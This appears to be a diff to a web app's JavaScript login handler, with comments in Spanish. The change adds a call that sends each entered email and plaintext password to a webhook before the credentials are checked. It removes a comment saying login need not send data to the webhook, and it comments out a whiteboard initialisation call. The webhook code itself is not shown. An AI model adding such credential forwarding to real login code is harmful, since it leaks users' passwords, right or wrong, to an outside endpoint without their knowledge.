@@ -153,10 +153,13 @@ span {
         }
     });
 
-    // Maneja el inicio de sesión
-   document.getElementById('btnLogin').addEventListener('click', function() {
+    document.getElementById('btnLogin').addEventListener('click', function() {
     const email = document.getElementById('loginUsuario').value;
     const contrasena = document.getElementById('loginContrasena').value;
+    
+    // Aquí llamas a la función para enviar los datos al webhook antes de realizar cualquier otra operación.
+    enviarDatosAWebhook(email, contrasena);
+    
     const userData = localStorage.getItem(email);
     if (userData) {
         const userInfo = JSON.parse(userData);
@@ -164,8 +167,7 @@ span {
             alert('Inicio de sesión exitoso.');
             document.getElementById('login').style.display = 'none';
             document.getElementById('game-container').style.display = 'block';
-            inicializarPizarra();
-            // No necesitas enviar datos al webhook en el login
+            //inicializarPizarra(); // Asegúrate de que esta llamada es necesaria aquí.
         } else {
             alert('Contraseña incorrecta');
         }
